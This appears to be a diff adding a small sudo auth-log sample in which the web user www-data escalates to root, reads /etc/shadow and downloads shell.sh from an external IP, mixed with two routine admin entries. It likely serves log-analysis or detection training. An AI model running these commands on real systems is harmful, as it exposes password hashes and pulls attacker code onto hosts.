@@ -1,0 +1,5 @@
+Jan 15 22:01:12 webserver sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
+Jan 15 22:01:15 webserver sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Jan 15 22:01:18 webserver sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.45/shell.sh
+Jan 15 08:30:01 webserver sudo: ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Jan 15 09:15:22 webserver sudo: ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
